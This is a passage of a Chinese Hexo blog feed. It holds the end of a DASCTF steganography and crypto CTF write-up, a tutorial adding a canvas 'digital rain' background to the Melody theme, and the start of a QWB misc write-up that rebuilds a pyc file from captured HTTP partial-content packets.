class="built_in">abs</span>(z - z0)</span><br><span class="line">        d1 = np.<span class="built_in">abs</span>(z - z1)</span><br><span class="line">        gen = <span class="built_in">zip</span>(<span class="built_in">range</span>(<span class="built_in">len</span>(z_detected)), d0, d1)</span><br><span class="line">        <span class="keyword">for</span> i, dd0, dd1 <span class="keyword">in</span> gen:</span><br><span class="line">            <span class="keyword">if</span> dd0 &lt; dd1:</span><br><span class="line">                m_detected[i] = <span class="number">0</span></span><br><span class="line">                z_detected[i] = z0[i]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                m_detected[i] = <span class="number">255</span></span><br><span class="line">                z_detected[i] = z1[i]</span><br><span class="line">        z_detected = z_detected.reshape(shape)</span><br><span class="line">        m_detected = m_detected.reshape(shape)</span><br><span class="line">        <span class="keyword">return</span> z_detected, m_detected.astype(<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">delta = <span class="number">20</span> <span class="comment"># quantization step</span></span><br><span class="line">qim = QIM(delta)</span><br><span class="line">filename = <span class="string">&#x27;ezSteganography-flag.png&#x27;</span></span><br><span class="line">image = Image.<span class="built_in">open</span>(filename)</span><br><span class="line">imdata = np.array(image)</span><br><span class="line">z_detected, msg_detected = qim.detect(imdata)</span><br><span class="line">im=Image.fromarray(np.uint8(msg_detected))</span><br><span class="line">im.show()</span><br></pre></td></tr></table></figure><p><img src="/p/wpFor-2021JulyDASCTF/res.png"></p><p>拿到了flag的另外半部分。</p><p>最后拼一下flag有：<strong>flag{2e9ec6480d05150c211963984dcbc9f1}</strong></p><h2 id="Just-a-GIF"><a href="#Just-a-GIF" class="headerlink" title="Just a GIF"></a>Just a GIF</h2><p>gif看不出什么，一般套路就是先把每一帧分离出来再说。</p><p>所以拿脚本分离：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">im=Image.<span class="built_in">open</span>(<span class="string">&#x27;./Just_a_GIF.gif&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cur=im.tell()</span><br><span class="line">        im.save(<span class="string">&#x27;frames/frame_&#x27;</span>+<span class="built_in">str</span>(cur).rjust(<span class="number">3</span>,<span class="string">&#x27;0&#x27;</span>)+<span class="string">&#x27;.png&#x27;</span>)</span><br><span class="line">        im.seek(cur+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="/p/wpFor-2021JulyDASCTF/image-20210801215817427.png"></p><p>就可以得到451帧的图片。</p><p>观察可以知道，每11张图片就是一个循环，有<code>451/11=41</code>个这样的循环。</p><p>一开始想比对一下各组循环的同一个位置的图片是不是同一张（比如<code>frame_000.png</code>和<code>frame_011.png</code>），所以写了个脚本跑了一下，xor两张图的对应像素，把黑的地方（<code>(0,0,0)</code>）置成白色，方便看一点：</p><p><img src="/p/wpFor-2021JulyDASCTF/res-1627826586721.png" alt="res"></p><p>发现有一些黑点点，意识到不对劲+1。</p><p>而下一组（<code>frame_011.png</code>和<code>frame_022.png</code>）的xor结果里黑点点更多了：</p><p><img src="/p/wpFor-2021JulyDASCTF/res2.png"></p><p>所以猜测是把同一个位置的全部xor起来。</p><p>但是41组异或完肯定又变成原来这个图为底图（xor的奇数特性），所以异或前40组和后40组都试了一下，发现后40组的更清晰（猜测第一组是原图，没有魔改那种），所以写脚本xor：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xorTuple</span>(<span class="params">t1,t2,size</span>):</span></span><br><span class="line">    ret=()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">        ret+=(t1[i]^t2[i],)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    width=<span class="number">119</span></span><br><span class="line">    height=<span class="number">83</span></span><br><span class="line">    res=[[(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(height)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(width)]</span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>+x,<span class="number">451</span>,<span class="number">11</span>): <span class="comment"># 后40组</span></span><br><span class="line">        im=Image.<span class="built_in">open</span>(<span class="string">&#x27;frames/frame_&#x27;</span>+<span class="built_in">str</span>(pos).rjust(<span class="number">3</span>,<span class="string">&#x27;0&#x27;</span>)+<span class="string">&#x27;.png&#x27;</span>)</span><br><span class="line">        img=im.convert(<span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">                res[i][j]=xorTuple(res[i][j],img.getpixel((i,j)),<span class="number">3</span>)</span><br><span class="line">    resImg=Image.new(<span class="string">&quot;RGB&quot;</span>,(width,height))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res[<span class="number">0</span>])):</span><br><span class="line">            <span class="keyword">if</span> res[i][j]!=(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>):</span><br><span class="line">                resImg.putpixel([i,j],res[i][j])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                resImg.putpixel([i,j],(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">    resImg.save(<span class="string">&quot;res_&quot;</span>+<span class="built_in">str</span>(x).rjust(<span class="number">3</span>,<span class="string">&#x27;0&#x27;</span>)+<span class="string">&quot;.png&quot;</span>)</span><br></pre></td></tr></table></figure><p>拿到了十一张图片：</p><p><img src="/p/wpFor-2021JulyDASCTF/res_000.png"></p><p><img src="/p/wpFor-2021JulyDASCTF/res_001.png"></p><p><img src="/p/wpFor-2021JulyDASCTF/res_002.png"></p><p><img src="/p/wpFor-2021JulyDASCTF/res_003.png"></p><p><img src="/p/wpFor-2021JulyDASCTF/res_004.png"></p><p><img src="/p/wpFor-2021JulyDASCTF/res_005.png"></p><p><img src="/p/wpFor-2021JulyDASCTF/res_006.png"></p><p><img src="/p/wpFor-2021JulyDASCTF/res_007.png"></p><p><img src="/p/wpFor-2021JulyDASCTF/res_008.png"></p><p><img src="/p/wpFor-2021JulyDASCTF/res_009.png"></p><p><img src="/p/wpFor-2021JulyDASCTF/res_010.png"></p><p>很明显就是要根据最后两张指示的位置来拼前九张图片。</p><p>写了个脚本拼接有：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">ans_list=[[<span class="number">7</span>,<span class="number">9</span>,<span class="number">5</span>],[<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>],[<span class="number">6</span>,<span class="number">4</span>,<span class="number">8</span>]] <span class="comment">#横过来的</span></span><br><span class="line"></span><br><span class="line">width=<span class="number">83</span></span><br><span class="line">height=<span class="number">83</span></span><br><span class="line">ans=[[(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(height*<span class="number">3</span>)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(width*<span class="number">3</span>)]</span><br><span class="line"><span class="keyword">for</span> pi <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> pj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        im=Image.<span class="built_in">open</span>(<span class="string">&#x27;res_&#x27;</span>+<span class="built_in">str</span>(ans_list[pi][pj]<span class="number">-1</span>).rjust(<span class="number">3</span>,<span class="string">&#x27;0&#x27;</span>)+<span class="string">&#x27;.png&#x27;</span>)</span><br><span class="line">        img=im.convert(<span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">                ans[pi*<span class="number">83</span>+i][pj*<span class="number">83</span>+j]=img.getpixel((i,j))</span><br><span class="line"></span><br><span class="line">ansImg=Image.new(<span class="string">&quot;RGB&quot;</span>,(width*<span class="number">3</span>,height*<span class="number">3</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ans)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ans[<span class="number">0</span>])):</span><br><span class="line">        ansImg.putpixel([i,j],ans[i][j])</span><br><span class="line">ansImg.save(<span class="string">&quot;ans.png&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/p/wpFor-2021JulyDASCTF/ans.png"></p><p>从之前学校ISCNU的科普（<a href="https://mp.weixin.qq.com/s?__biz=MzA5OTcwMzIxNA==&mid=2651412994&idx=1&sn=cd08b14f40acc9d3073533d43b15b251">CTF知识树 | 第五期: 你不知道的那些二维码</a>）可以知道是data matrix，用解码网站（<a href="https://products.aspose.app/barcode/recognize/datamatrix#/recognized">Read Data Matrix Barcode Online</a>）扫一下就能拿到flag：</p><p><strong>DASCTF{6bb73086aeb764b5727529d82b084cce}</strong></p><h2 id="问卷题"><a href="#问卷题" class="headerlink" title="问卷题"></a>问卷题</h2><p>直接做问卷拿flag</p><p><strong>DASCTF{79f3bb47a2e2d46def82c052eccb7b80}</strong></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Yusa的密码学签到——BlockTrick"><a href="#Yusa的密码学签到——BlockTrick" class="headerlink" title="Yusa的密码学签到——BlockTrick"></a>Yusa的密码学签到——BlockTrick</h2><p>不懂密码学啥攻击方式的人看着这个脚本真的一脸懵逼（</p><p>但是想了想……签到题嘛说不定能瞎猫碰上死耗子，加上这个<code>for _ in range(2):</code>有点奇怪，感觉是专门能用来复用信息的，于是把第一次的输出当成第二次的输入再丢进去，就成了&#x3D; &#x3D;</p><p><img src="/p/wpFor-2021JulyDASCTF/image-20210801223008233.png"></p><p><strong>flag{edbffcb1-eb55-4ae3-8cc5-3b65663f1fec}</strong></p>]]></content>
      
      
      <categories>
          
          <category> Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Misc </tag>
            
            <tag> wp </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Melody主题的背景代码雨特效</title>
      <link href="p/blogsFor-hexo-addingDigitalRainInMelody/"/>
      <url>p/blogsFor-hexo-addingDigitalRainInMelody/</url>
      
        <content type="html"><![CDATA[<p>一个多月前折腾完的melody主题上的背景代码雨特效，今天终于良心发现来填坑了）</p><p>顺便吐槽一句melody相关的资料真的好少，完全靠自己看主题源码+和其他主题对比来摸索，这大概就是开荒的痛并快乐着吧T.T。（形成用户生态是有多重要.jpg</p><a id="more"></a><blockquote><p>参考文章（<a href="https://blog.csdn.net/qq_36759224/article/details/85420403">Hexo 博客优化之博客美化系列（持续更新）</a>）里的是以<code>Material</code>主题为例，本文以<code>Melody</code>主题为例。</p></blockquote><p>背景效果如图（<a href="https://c10udlnk.top/">https://c10udlnk.top/</a>）：</p><p><img src="/p/blogsFor-hexo-addingDigitalRainInMelody/image-20210714151554043.png"></p><p>以下步骤均以博客文件夹为当前目录。</p><h1 id="js文件创建"><a href="#js文件创建" class="headerlink" title="js文件创建"></a>js文件创建</h1><p>在<code>.\node_modules\hexo-theme-melody\source\js</code>下新建一个<code>DigitalRain.js</code>（跟参考文章的不一样，原文章的特效定位有问题，所以这里有魔改）：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> canvas = <span class="built_in">document</span>.createElement(<span class="string">&#x27;canvas&#x27;</span>),</span><br><span class="line">    context = canvas.getContext(<span class="string">&#x27;2d&#x27;</span>),</span><br><span class="line">    pr = <span class="built_in">window</span>.devicePixelRatio || <span class="number">1</span>,</span><br><span class="line">    width = <span class="built_in">window</span>.innerWidth,</span><br><span class="line">    height = <span class="built_in">window</span>.innerHeight</span><br><span class="line">    canvas.width = width * pr</span><br><span class="line">    canvas.height = height * pr</span><br><span class="line">    context.scale(pr, pr)</span><br><span class="line">    context.globalAlpha = <span class="number">0.8</span></span><br><span class="line">    canvas.style.cssText =</span><br><span class="line">    <span class="string">&#x27;opacity:0.8;position:fixed;top:0;left:0;z-index:-1;width:100%;height:100%;pointer-events:none;&#x27;</span></span><br><span class="line">    <span class="comment">// create canvas</span></span><br><span class="line">    <span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;body&#x27;</span>)[<span class="number">0</span>].appendChild(canvas);</span><br><span class="line">    <span class="comment">// var canvas = document.getElementById(&quot;mycanvas&quot;);</span></span><br><span class="line">    <span class="comment">// //获取画布的上下文</span></span><br><span class="line">    <span class="comment">// var context =canvas.getContext(&quot;2d&quot;);</span></span><br><span class="line">    <span class="comment">// var s = window.screen;</span></span><br><span class="line">    <span class="comment">// var W = canvas.width = s.width;</span></span><br><span class="line">    <span class="comment">// var H = canvas.height;</span></span><br><span class="line">    <span class="comment">//获取浏览器屏幕的宽度和高度</span></span><br><span class="line">    <span class="comment">//var W = window.innerWidth;</span></span><br><span class="line">    <span class="comment">//var H = window.innerHeight;</span></span><br><span class="line">    <span class="comment">//设置canvas的宽度和高度</span></span><br><span class="line">    <span class="comment">// canvas.width = W;</span></span><br><span class="line">    <span class="comment">// canvas.height = H;</span></span><br><span class="line">    <span class="comment">//每个文字的字体大小</span></span><br><span class="line">    <span class="keyword">var</span> fontSize = <span class="number">12</span>;</span><br><span class="line">    <span class="comment">//计算列</span></span><br><span class="line">    <span class="keyword">var</span> colunms = <span class="built_in">Math</span>.floor(canvas.width /fontSize);  </span><br><span class="line">    <span class="comment">//记录每列文字的y轴坐标</span></span><br><span class="line">    <span class="keyword">var</span> drops = [];</span><br><span class="line">    <span class="comment">//给每一个文字初始化一个起始点的位置</span></span><br><span class="line">    <span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">var</span> i=<span class="number">0</span>;i&lt;colunms;i++</span>)</span>&#123;</span><br><span class="line">        drops.push(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//运动的文字</span></span><br><span class="line">    <span class="keyword">var</span> str =<span class="string">&quot;r3ver5e.4^fun c10udlnk&quot;</span>;</span><br><span class="line">    <span class="comment">//4:fillText(str,x,y);原理就是去更改y的坐标位置</span></span><br><span class="line">    <span class="comment">//绘画的函数</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">draw</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        context.fillStyle = <span class="string">&quot;rgba(238,238,238,.09)&quot;</span>;<span class="comment">//遮盖层</span></span><br><span class="line">        context.fillRect(<span class="number">0</span>,<span class="number">0</span>,canvas.width,canvas.height);</span><br><span class="line">        <span class="comment">//给字体设置样式</span></span><br><span class="line">        context.font = <span class="string">&quot;600 &quot;</span>+fontSize+<span class="string">&quot;px  Consolas&quot;</span>;</span><br><span class="line">        <span class="comment">//给字体添加颜色</span></span><br><span class="line">        context.fillStyle = randColor();<span class="comment">//[&quot;#33B5E5&quot;, &quot;#0099CC&quot;, &quot;#AA66CC&quot;, &quot;#9933CC&quot;, &quot;#99CC00&quot;, &quot;#669900&quot;, &quot;#FFBB33&quot;, &quot;#FF8800&quot;, &quot;#FF4444&quot;, &quot;#CC0000&quot;][parseInt(Math.random() * 10)];可以rgb,hsl, 标准色，十六进制颜色</span></span><br><span class="line">        <span class="comment">//写入画布中</span></span><br><span class="line">        <span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">var</span> i=<span class="number">0</span>;i&lt;colunms;i++</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> index = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * str.length);</span><br><span class="line">            <span class="keyword">var</span> x = i*fontSize;</span><br><span class="line">            <span class="keyword">var</span> y = drops[i] *fontSize;</span><br><span class="line">            context.fillText(str[index],x,y);</span><br><span class="line">            <span class="comment">//如果要改变时间，肯定就是改变每次他的起点</span></span><br><span class="line">            <span class="function"><span class="title">if</span>(<span class="params">y &gt;= canvas.height &amp;&amp; <span class="built_in">Math</span>.random() &gt; <span class="number">0.99</span></span>)</span>&#123;</span><br><span class="line">                drops[i] = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            drops[i]++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">randColor</span>(<span class="params"></span>)</span>&#123;<span class="comment">//随机颜色</span></span><br><span class="line">        <span class="keyword">var</span> r = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">256</span>);</span><br><span class="line">        <span class="keyword">var</span> g = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">256</span>);</span><br><span class="line">        <span class="keyword">var</span> b = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">256</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;rgb(&quot;</span>+r+<span class="string">&quot;,&quot;</span>+g+<span class="string">&quot;,&quot;</span>+b+<span class="string">&quot;)&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    draw();</span><br><span class="line">    <span class="built_in">setInterval</span>(draw,<span class="number">35</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="更改pug文件"><a href="#更改pug文件" class="headerlink" title="更改pug文件"></a>更改pug文件</h1><p>把<code>.\node_modules\hexo-theme-melody\layout\includes\additional-js.pug</code>里最开头添加一句：<code>include ./third-party/DigitalRain.pug</code></p><p><img src="/p/blogsFor-hexo-addingDigitalRainInMelody/image-20210714163807222.png"></p><p>然后在<code>.\node_modules\hexo-theme-melody\layout\includes\third-party</code>下新建一个<code>DigitalRain.pug</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script(src&#x3D;url_for(&#39;&#x2F;js&#x2F;DigitalRain.js&#39;))</span><br></pre></td></tr></table></figure><p><img src="/p/blogsFor-hexo-addingDigitalRainInMelody/image-20210714163902675.png"></p><p>这样背景就有代码雨特效啦~</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> zero2one/入门 </tag>
            
            <tag> u5eful </tag>
            
            <tag> 折腾经历 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【wp】2021强网杯-ExtremelySlow</title>
      <link href="p/wpFor-2021qwb/"/>
      <url>p/wpFor-2021qwb/</url>
      
        <content type="html"><![CDATA[<p>继续填坑ing，是强网杯的一道Misc题<code>ExtremelySlow</code>，跟npy合力做的一道杂项题（双双转行Misc手就离谱x），当时捞了个七血，可惜这个题最后被打穿了（</p><p>赛中的大概思路就是把传的一个一个字节按顺序提取出来并复原出传输的文件，因为两个工具都不兼容python3.10所以直接手逆pyc+手抠隐写字节码，最后拿到flag。</p><p>这里还进行了一点赛后改进，包括魔改stegosaurus兼容到3.10。</p><a id="more"></a><h1 id="【Misc】ExtremelySlow"><a href="#【Misc】ExtremelySlow" class="headerlink" title="【Misc】ExtremelySlow"></a>【Misc】ExtremelySlow</h1><h2 id="赛中思路"><a href="#赛中思路" class="headerlink" title="赛中思路"></a>赛中思路</h2><h3 id="流量包中提取复原出文件"><a href="#流量包中提取复原出文件" class="headerlink" title="流量包中提取复原出文件"></a>流量包中提取复原出文件</h3><p>查看流量包，注意到<code>HTTP/1.1 206 Partial Content</code>的包都是对get包的回答，并且都是<code>/latest</code>文件的一个字节。</p><p><del>（一字节一字节地传，难怪叫ExtremelySlow&#x3D; &#x3D;）</del></p><p><img src="/p/wpFor-2021qwb/image-20210712160129393.png"></p><p>双击<code>HTTP/1.1 206 Partial Content</code>包查看（以No.10这个包为例）：</p><p><img src="/p/wpFor-2021qwb/image-20210712160224633.png"></p><p><img src="/p/wpFor-2021qwb/image-20210712160239511.png"></p><p>可以知道这个包返回的是文件的第0字节<code>0x6f</code>，其余包同理。</p><p>所以选中所有这样的回复包，然后导出为纯文本，保存在<code>out.txt</code>中。</p><p><img src="/p/wpFor-2021qwb/image-20210712155918386.png"></p><p>然后写脚本从txt里提取这些字节并按顺序还原出源文件（直接把npy脚本搬过来了）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./out.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line">data = data.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">r1 = []</span><br><span class="line">r2 = []</span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;content-range:&#x27;</span> <span class="keyword">in</span> d:</span><br><span class="line">        r1.append(d)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;0000  &#x27;</span> <span class="keyword">in</span> d <span class="keyword">and</span> <span class="keyword">not</span> <span class="string">&#x27;0.290470000&#x27;</span> <span class="keyword">in</span> d:</span><br><span class="line">        r2.append(d)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(len(r1))</span></span><br><span class="line"><span class="comment"># print(len(r2))</span></span><br><span class="line"></span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(r1)):</span><br><span class="line">    data.append((re.findall(<span class="string">r&quot;\d+\.?\d*&quot;</span>,r1[i])[<span class="number">0</span>], <span class="string">&#x27;0x&#x27;</span>+r2[i][<span class="number">6</span>:<span class="number">8</span>]))</span><br><span class="line"></span><br><span class="line">data = <span class="built_in">sorted</span>(data, key=<span class="keyword">lambda</span> t: <span class="built_in">int</span>(t[<span class="number">0</span>]))</span><br><span class="line"><span class="comment"># for d in data:</span></span><br><span class="line"><span class="comment">#     print(d)</span></span><br><span class="line">result = [<span class="built_in">int</span>(d[<span class="number">1</span>],<span class="number">16</span>) <span class="keyword">for</span> d <span class="keyword">in</span> data]</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(len(result))</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./res&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">bytes</span>(result))</span><br></pre></td></tr></table></figure><h3 id="pyc逆向"><a href="#pyc逆向" class="headerlink" title="pyc逆向"></a>pyc逆向</h3><p>拿到这个文件，用010打开看到经典第二行E3000000…， <del>逆向手dna狂喜，</del> 直接猜测是pyc文件，加上pyc后缀。</p><p><img src="/p/wpFor-2021qwb/image-20210614152120204.png"></p><p>用uncompyle6和pycdc反编译，但是都由于魔数不对报错，于是把第一个字节改成<code>0x55</code>，假装这是3.8的pyc，反编译依然失败，于是只能用pycdas（<a href="https://github.com/zrax/pycdc">zrax&#x2F;pycdc: C++ python bytecode disassembler and decompiler</a>）反汇编出字节码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span 